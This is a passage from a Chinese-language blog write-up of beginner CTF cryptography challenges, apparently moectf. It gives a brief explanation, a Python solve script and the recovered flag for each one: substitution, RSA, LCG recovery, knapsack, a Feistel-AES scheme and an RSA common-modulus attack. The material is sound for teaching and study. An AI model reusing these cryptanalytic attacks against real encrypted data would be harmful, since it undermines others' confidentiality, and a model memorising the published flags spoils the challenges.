class="number">1.6094870669615087e+48</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">2.3886906014249767e+50</span>, <span class="number">1.9862648361376436e+44</span>,</span><br><span class="line"> <span class="number">2.6195173187490456e+53</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">7.016735912097614e+20</span>, <span class="number">2.178203880729008e+47</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">1.811239082889014e+41</span>,</span><br><span class="line"> <span class="number">1.6094870669615087e+48</span>, <span class="number">5.920972027664636e+47</span>, <span class="number">214643579785915.7</span>, <span class="number">3.6379709476087856e+42</span>, <span class="number">7.307059979368028e+43</span>, <span class="number">5.399227610580139e+44</span>,</span><br><span class="line"> <span class="number">3.989519570547194e+45</span>, <span class="number">5.920972027664636e+47</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">3.5451311827611436e+52</span>, <span class="number">1.6094870669615087e+48</span>, <span class="number">6.493134255664421e+50</span>,</span><br><span class="line"> <span class="number">3.23274119108484e+49</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">1.2523631708422093e+29</span>, <span class="number">3.23274119108484e+49</span>, <span class="number">3.5451311827611436e+52</span>, <span class="number">4.375039447261315e+48</span>,</span><br><span class="line"> <span class="number">2.3886906014249767e+50</span>, <span class="number">7.016735912097614e+20</span>, <span class="number">1.811239082889014e+41</span>, <span class="number">9.889030319346894e+42</span>, <span class="number">3.831008000716566e+22</span>, <span class="number">3.23274119108484e+49</span>,</span><br><span class="line"> <span class="number">1.4093490824269349e+22</span>, <span class="number">1.4093490824269349e+22</span>, <span class="number">3.23274119108484e+49</span>, <span class="number">1.9355760420357097e+54</span>]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cip)):</span><br><span class="line">    flag.append(math.log(cip[i],math.e))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#moectf&#123;c0me_on!begin_your_Crypt0_c4r33r&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>BabyMultiple</strong></em></p><blockquote><p>看代码，大概意思就是把flag用encode函数进行了一次加密。跟第一题一样，逆向去写解密脚本就好了~<br> <del>不过由于懒得动脑子了，</del> 可以观察一下，这个题是属于单字符加密，也就是一个明文字符对应一个确定的密文字符，所以我们可以直接把所有字符的加密结果都打印出来，然后在里边找我们需要的字符就好了。<br> 这里我把所有字符的加密后结果放在cyberlist里。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span></span><br><span class="line">cyberlist=<span class="built_in">list</span>(<span class="string">&quot;a61WRMHCxsnid94ZUPKFAvqlgb72XSNIDytoje_50VQLGBwrmhc83YTOJEzupkf&quot;</span>)</span><br><span class="line">flag=<span class="string">&#x27;g3AfJPOfHPOJFfJuf_AYux1JFx39&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    j=cyberlist.index(i)</span><br><span class="line">    <span class="built_in">print</span>(table[j],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#y0u_4r3_gr34t_47_Mu17ic4ti0n</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>LazyRSA</strong></em></p><blockquote><p>一个简单的RSA加密<br>求(p-1)*(q-1)的逆元可以用gmpy2库的invert，然后pow一下就好了<br><del>by the way: 这两个库真难装······</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =  <span class="number">7049120988661090136959367990211624032671088374397430253722914704672269343351268486642692858477617370573493581346846411168539408811542592351582581576539221</span></span><br><span class="line">q =  <span class="number">11595461299251293002401295606096202123601375776115430944343338141843770078346355504245510150744085418550473572002573306023521368183889972175846278163010889</span></span><br><span class="line">c =  <span class="number">48425576447741107904942007362859939933300480519833273210397511573241220126734053813936424490872852942885069257318462762079636783871415500644717758273774268724488497979368196170897933989184449432995120246590652553995031347596620505647525475638040859263109628716173897321613612254357251120398449111747305089380</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag=<span class="built_in">pow</span>(c,gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)),p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment">#moectf&#123;w0w_yOU_Know_h0w_70_d3crypt_th3_RSA&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>PRintNewG</strong></em></p><blockquote><p><del>做的最痛苦的一道题······</del><br>观察一下代码，是要解一个方程组，假设flag是m0的话，那么就是要解如下方程组：<br>(am0+b)%n=m1<br>(am1+b)%n=m2<br>(am2+b)%n=m3<br>这里要了解一下乘法逆元的概念。<br>方程ax%n=1,那么求x就叫求a关于n的乘法逆元。<br>而对ay%n=m，求出a关于n的乘法逆元后再乘以m模n即可。<br>此处的b可以用两个方程组相减来消去b，得到如下两个方程：<br>a(m0-m1)%n=m2-m1<br>a(m2-m1)%n=m2-m3<br>那么就可以直接当成二元方程组求解即可。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">164955381960104851576442781839629371483790790743830073857213053104860144345367</span></span><br><span class="line">m1=<span class="number">67066424717605861916529090048670931008913194546199003522357504998012803616537</span></span><br><span class="line">m2=<span class="number">14585402872351563180055857554749250191721167730349724393021149201170995608751</span></span><br><span class="line">m3=<span class="number">68393939370424772490169906192546208899639826391163845848999554903218827210979</span></span><br><span class="line"></span><br><span class="line">a=(gmpy2.invert(m2-m1,n))*(m3-m2)%n</span><br><span class="line">m=((gmpy2.invert(a,n))*(m1-m2)+m1)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#moectf&#123;PR1nt_N3w_G_s0_e45y&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>NumberTheory-FeeeeeMa</strong></em></p><blockquote><p>~~虽然叫费马，但考的还是RSA~~~<br>扔到kafu里分解一下n：<br>PRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041<br>PRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919<br>直接上手：</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c=<span class="number">5883797662470459824355663245986072888499217007658131616834157815812099907584034205088255553387720712715657503553785084616903197734118992506040765948815581238738585159640841277023597023582148173041980600751980206228524475872232080917683822098342300418744639304147771013376863895727877847094151770079046205501266017838881847833528612089868825489776289686550273385136080255799772961155599801690997753649087689949021276549323525754963020408864310302166537661098308581259246052869844362142747080042122189010627048397501817473817946566885487595098504403459522534124404289032779842658407728856164570059823567667669076044563549721918886430160041337156249733571322684187916005175717585587552966989348534775572282369273898182367851689305440672199427492706130124832744127722533758962606513875787129378871099575729793745175327897215145024490319291830298017471555440811147903390803597635585696411407922981136489077349754222355529320548946411677051716584081079246752768224289803323109047467790868885987703125118276891234633889937243303027095375365791207055516900563280115276282761652663098154769929217653527103304045922204641545963828632051715956492613217136463227530538723452005224696385225174844198627387638874395654771260577791169209134146482</span></span><br><span class="line">p=<span class="number">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041</span></span><br><span class="line">q=<span class="number">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919</span></span><br><span class="line">flag=<span class="built_in">pow</span>(c,gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)),p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment">#moectf&#123;y0u_c4n_e4s1ly_f4ctor_th3_N&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>BBBBBBBackpack</p><blockquote><p>不是很懂背包，这个题倒着依次乘一下加回去就好了。<br><del>我也不知道什么背包问题？？？</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="number">0</span></span><br><span class="line">backpack=[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">670</span>, <span class="number">1844</span>, <span class="number">5535</span>, <span class="number">19547</span>, <span class="number">75437</span>, <span class="number">259056</span>, <span class="number">974664</span>, <span class="number">2399609</span>, <span class="number">7304021</span>, <span class="number">18537736</span>, <span class="number">38733276</span>, <span class="number">143785607</span>, <span class="number">300890806</span>, <span class="number">778420517</span>, <span class="number">3112554961</span>, <span class="number">9955080778</span>, <span class="number">34625138877</span>, <span class="number">103531993246</span>, <span class="number">294207209833</span>, <span class="number">632363887456</span>, <span class="number">2341888528510</span>, <span class="number">8736224869982</span>, <span class="number">33727228149167</span>, <span class="number">113026240109398</span>, <span class="number">334534210335245</span>, <span class="number">754812282783351</span>, <span class="number">2871232541211362</span>, <span class="number">7147990367228081</span>, <span class="number">16813142520913249</span>, <span class="number">62232346665698392</span>, <span class="number">132813746566508109</span>, <span class="number">436969187287191174</span>, <span class="number">1371311321857557068</span>, <span class="number">3465499917202578303</span>, <span class="number">10761115866584374884</span>, <span class="number">25998484366411649657</span>, <span class="number">81986464388691181616</span>, <span class="number">324842980726420787162</span>, <span class="number">1063428202306999892763</span>, <span class="number">3318046410585817603032</span>, <span class="number">12569059003729082352479</span>, <span class="number">29822650425811094387624</span>, <span class="number">89829868596281155601134</span>, <span class="number">207467076929560545986692</span>, <span class="number">424101883375592006882573</span>, <span class="number">1410057940679583010646572</span>, <span class="number">4795250448769489602371933</span>, <span class="number">12419955465903295439689190</span>, <span class="number">32127052925660652338148413</span>, <span class="number">121768246803017981541739592</span>, <span class="number">286293639144639999224246905</span>, <span class="number">876618562849333372078886060</span>, <span class="number">3495370549956845610130431964</span>, <span class="number">13777448384830441398471073019</span>, <span class="number">45339968634224370226443992856</span>, <span class="number">159636974047457043534720001443</span>, <span class="number">403806399587759901542286515690</span>, <span class="number">1190949464093267805434271517577</span>, <span class="number">2625636206558220580206955200643</span>, <span class="number">5447410189447132699195152662348</span>, <span class="number">13798370097217657917056458399390</span>, <span class="number">42652195271813913821236091812630</span>, <span class="number">87624112365004035907264763291796</span>, <span class="number">295833079631922620770335225824586</span>, <span class="number">717255284196409248439771704866883</span>, <span class="number">2119024457898120787521595829459142</span>, <span class="number">8097762744600097674390735606807128</span>, <span class="number">22990496332708170421088808438995636</span>, <span class="number">55268619563994680834441597248247582</span>, <span class="number">157779112538179073738464223501777499</span>, <span class="number">553561084981889545670380643023607621</span>, <span class="number">2094594867042850711386606235023415160</span>, <span class="number">7427564397983932982484534762285032864</span>, <span class="number">28541899514275079822011638819911534081</span>, <span class="number">59854615377110931361953157015440306520</span>, <span class="number">137071568336121640486639449884477676903</span>, <span class="number">434368553369190183317274206512577489165</span>, <span class="number">1607515956833802196435755021284640023303</span>, <span class="number">4247439813046769661567823675143526066989</span>, <span class="number">12252982336388472725165513300377051313644</span>, <span class="number">43586970358791422986656986286232849952290</span>, <span class="number">94754002216262928157061686798919700234151</span>, <span class="number">205403633516427560050027271636224615375855</span>, <span class="number">727922215919878343821825296552148942903123</span>, <span class="number">1541646353685774868780093433673052445519807</span>, <span class="number">5703469721749658936787093922654529457118594</span>, <span class="number">20762100689139896330208273986505541316962105</span>, <span class="number">80195197197818086812949239946286778357513961</span>, <span class="number">198522126001869063688321920177617046841212852</span>, <span class="number">719060816608760633741229682178956301630549900</span>, <span class="number">2171712751463320729665634385979825928332317622</span>, <span class="number">7968526190188064156742281507099763347000210904</span>, <span class="number">20302513556821857703528100337806260797703562338</span>, <span class="number">54967103106163860243927426134510653397499429384</span>, <span class="number">189866376897538250029834405810321956080892995934</span>, <span class="number">516088075785491414669664215795496674103100750375</span>, <span class="number">1531616665488077085604100033058238685259376456655</span>, <span class="number">4795563798371064843556375420641263389159268373753</span>, <span class="number">12715206263244537077480789152826620386135239585589</span>, <span class="number">45628223673569886022145657218662773486560769778049</span>, <span class="number">127988774487590162169660910342623736153210927472871</span>, <span class="number">429761810968391607465089641939438991272623610573254</span>, <span class="number">1694286408402338132220805654166083638884822137745848</span>, <span class="number">5577419986858786911316434594350519553014729018524982</span>, <span class="number">22146179230778265190752372551893625479326089828877879</span>, <span class="number">78983119075073724439850825731329386811892547014513513</span>, <span class="number">165805826557531832743325076551678254671357810872202277</span>, <span class="number">525687524776397669648788242907896052104054917192402349</span>, <span class="number">1596680185629512867035574394423929715498386636216930988</span>, <span class="number">3808351509446054183279144714875260973968494634290203802</span>, <span class="number">10792542598439044383994436390450612942036864538927761344</span>, <span class="number">31776077718298264756461043701077481610506447838959767949</span>, <span class="number">69483787236434708634666641366101673156349500969799745632</span>, <span class="number">212620878051727200345257734337176214877612639791408110401</span>, <span class="number">565705372069455623425268706185184158331866127768259060570</span>, <span class="number">2228971348185635371906791535156337404926063871528397270892</span>, <span class="number">4859328204121938264839760465087547752629065763656619388434</span>, <span class="number">14185348803209161448182653444177464165713091554806223414499</span>, <span class="number">44242932119616103779840255273986809836494122475150635493273</span>, <span class="number">156176016196847319874949580221731690886061627436916661422852</span>, <span class="number">472567672907289753186461661432798790751774534772655287936877</span>, <span class="number">1765317440470718113352833182911767208733594355879647245836603</span>, <span class="number">5835719030771522391675663002032404790451900100534570526468736</span>, <span class="number">14528961633147270325279483890277955669830128461595478399405580</span>, <span class="number">53503137764341373520101774208921450303897226002280491351371881</span>, <span class="number">153340302591307960181257267214621247064964249027062324798966650</span>, <span class="number">467036429085212303265974827129085622046910166509299763268535756</span>, <span class="number">1760478013800716951650816419888923889893355872867499404847043361</span>, <span class="number">4791886951911545137378952129838133145784256723738609871941913863</span>, <span class="number">19126760116038883506408830737976498053029475253123685318001466609</span>, <span class="number">51635927378821965754946959553487670084314385367430813170544188707</span>, <span class="number">203944552994591250724882161307279862158139878326498083669171922709</span>, <span class="number">718868928147325949276701359623063723395455731358210896767864810436</span>, <span class="number">2005627527854915017699090052821431775394584514441537184407714355949</span>, <span class="number">6108484926321410509000933490330125849664844216966621898372849074206</span>, <span class="number">15273733259375332107091552084526951416159646708621190826219429490015</span>, <span class="number">34145117254940196604842578208457005181132408450899191627170638987883</span>, <span class="number">120825229084143066199868275091825674337472013226784591902132114229359</span>, <span class="number">387687667198606192147021527980207738864855944986764666796629571317797</span>, <span class="number">1461874344207808204456192497546273455901754164965322967295868406627707</span>, <span class="number">3258300231591322626530795072101331694347928535549768492906530809069244</span>, <span class="number">8874418273687545553519370439384854004509761935319681848589844232674343</span>, <span class="number">26555971104148502495508475192114409958713364020252024170586326291995544</span>, <span class="number">56653286369586527413345416396708661964062474995701742952261047069623359</span>, <span class="number">154383566127721041301459355493059400704799197964228029280865862358894596</span>, <span class="number">341393868848806018386217706353404785528207249510734290203621418976352706</span>, <span class="number">1171362524761660822765817023463786914069613269413196584856696440695273738</span>, <span class="number">4194882148022101614597714583113090146333385168895367467002069867303753334</span>, <span class="number">10081717223153632058965668126630772845024206141591578024505075742926631137</span>, <span class="number">39590555580101758090745061229221178837429140073072263518741551403983751377</span>, <span class="number">124978669991117804453179514660098523434116842472570073354436333226196401318</span>, <span class="number">285677744249355467333640461312079508294900634926466871637187648581093663108</span>, <span class="number">685643590088926190360498081484403342771108281930489395367499236756131358960</span>, <span class="number">2509513194338799699151211958956210034789618340347017416940796124375457114430</span>, <span class="number">7869725510782496795692771133398729561144872690341264618424961946628895219979</span>]</span><br><span class="line">l_list=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">l_list=l_list[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l_list)):</span><br><span class="line">    flag=flag+l_list[i]*backpack[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>FesitelTripple</strong></em></p><blockquote><p><del>有点像DES，可惜不是，但是差不太多emmm</del><br><del>其实没太看懂，瞎改了一通反正跑出来了（bushi</del><br>DES里的加密和解密最后一轮是不会左右互换的，但是这里最后一轮还会互换，并且密钥依次用了keysteam里的16位<br>那么把range改成倒着来的，然后解密换成加密，加密换成解密就好了</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plaintext, keystream</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plaintext) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(keystream) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    left = plaintext[:<span class="number">16</span>]</span><br><span class="line">    right = plaintext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        aes = AES.new(keystream[i * <span class="number">16</span>:i * <span class="number">16</span> + <span class="number">16</span>], AES.MODE_ECB)</span><br><span class="line">        new_right = long_to_bytes(bytes_to_long(aes.encrypt(right)) ^ bytes_to_long(left))</span><br><span class="line">        new_left = right</span><br><span class="line">        left = new_left</span><br><span class="line">        right = new_right</span><br><span class="line">    <span class="keyword">return</span> left + right</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext, keystream</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(keystream) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    left = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    right = ciphertext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        aes = AES.new(keystream[i * <span class="number">16</span>:i * <span class="number">16</span> + <span class="number">16</span>], AES.MODE_ECB)</span><br><span class="line">        old_right = left</span><br><span class="line">        old_left = long_to_bytes(bytes_to_long(right) ^ bytes_to_long(aes.encrypt(old_right)))</span><br><span class="line">        left = old_left</span><br><span class="line">        right = old_right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> left + right</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher=long_to_bytes(<span class="number">8465484536296110246056264738507061716988653458463168290845919961738127701895</span>)</span><br><span class="line">key1 = <span class="string">b&#x27;it_is_just_the_first_time_key_and_encrypt_twice~&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = decrypt(cipher, key1)</span><br><span class="line">cipher = encrypt(cipher, key2)</span><br><span class="line">flag = decrypt(cipher, key1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#moectf&#123;th3_f3sit3l_1s_symmetric&#125;</span></span><br></pre></td></tr></table></figure><blockquote><blockquote><p><em><strong>NumberTheory-Powwwwwer</strong></em></p><blockquote><p>是RSA一种常见的攻击方式：共模攻击。<br><del>其实是网上嫖的代码QAQ</del></p></blockquote></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 = <span class="number">0x114514</span></span><br><span class="line">e2 = <span class="number">11451401</span></span><br><span class="line">n = <span class="number">136101507305579392638535644920761633964164170724862786826983346232384615490056114520867809528578619044234996682189743771790469301482774597055261893015794231752161620186891313083697906603842794202124169703689691049507643124840305144271549786654248958903748746153284903228556081709492696702282014035715848536699</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">47220438825147485602004110821622560065904207675219860468929327492230243119464967323930295623259686691976072363819976125368307866223981062386682077438030452670319556977872343275419275297828846355087444641575933688543206152050119271402939885941719672725566836549228027040543887994457719131600949478670978241146</span></span><br><span class="line">c2=<span class="number">115435415972673976853578931507112950322194896557724940548983105717498084920603530063295392396344585245149536619546139549595643165285610305977637286040529163780201012187105549728000887169595946039777889559399483628995380569296124138575774025562472143420878790970785857061634021973901034670780393435693955936244</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">pow</span>(c1, r, n) * <span class="built_in">pow</span>(c2, s, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span 